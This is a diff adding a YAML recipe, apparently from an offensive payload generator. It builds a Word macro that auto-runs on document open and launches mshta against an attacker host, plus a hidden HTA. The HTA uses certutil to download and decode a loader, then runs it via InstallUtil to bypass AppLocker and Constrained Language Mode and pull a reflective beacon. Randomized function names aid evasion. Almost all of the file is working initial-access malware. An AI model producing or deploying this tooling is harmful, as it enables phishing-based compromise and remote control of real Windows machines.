@@ -1,0 +1,68 @@
+description: "VBA Macro for executing mshta, dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass) (No Powershell)"
+variables:
+  outputdir: "output"
+  vbaFile: "hta-vba-powershell-clm-reflective.vba"
+  htaFile: "hta-vba-powershell-clm-reflective.hta"
+  revshellFile: "loader.exe"
+  port: 80
+templates:
+  macro:
+    variables:
+      command: "mshta http://{{LHOST}}:{{port}}/{{htaFile}}"
+      payload_fn: "{{ Helpers.random_str() }}"
+      wsh_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{wsh_fn}}
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        {{wsh_fn}}.Run "{{command}}"
+        Set {{wsh_fn}} = Nothing
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+  hta:
+    variables:
+      cmd_download: "certutil -urlcache -f http://{{LHOST}}:{{port}}/clmloader.txt C:\\windows\\tasks\\clmloader.txt"
+      cmd_decode: "certutil -decode C:\\Windows\\Tasks\\clmloader.txt C:\\windows\\tasks\\clmloader.exe"
+      cmd_execute: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /uri=http://{{LHOST}}:{{port}}/{{revshellFile}} /U "C:\Windows\Tasks\clmloader.exe"'
+      wsh_fn: "{{ Helpers.random_str() }}"
+      fso_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      <script language="VBScript">
+        window.moveTo -4000, -4000
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        Set {{fso_fn}} = CreateObject("Scripting.FileSystemObject")
+        For each path in Split({{wsh_fn}}.ExpandEnvironmentStrings("%PSModulePath%"),";")
+          If {{fso_fn}}.FileExists(path + "\..\powershell.exe") Then
+            {{wsh_fn}}.Run "cmd /c {{cmd_download}}",0
+            {{wsh_fn}}.Run "cmd /c {{cmd_decode}}",0
+            {{wsh_fn}}.Run "cmd /c start {{cmd_execute}}",0
+            Exit For
+          End If
+        Next
+        window.close()
+      </script>
+print:
+- "Generating a basic VBA to execute mshta and spawn a beacon utilising a CLM bypass and reflection (No Powershell)"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+- "HTA File: {{outputdir}}/{{htaFile}}"
+- mshta http://{{LHOST}}:{{port}}/{{revshellFile}}
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+- "rm -rf {{outputdir}}/{{htaFile}}"
+- "rm -rf {{outputdir}}/clmloader.txt"
+- "base64 -w0 <{{outputdir}}/clmloader.exe >{{outputdir}}/clmloader.txt"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{htaFile}}
+  {{Templates.get('hta')}}
+  EOF
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('macro')}}
+  EOF
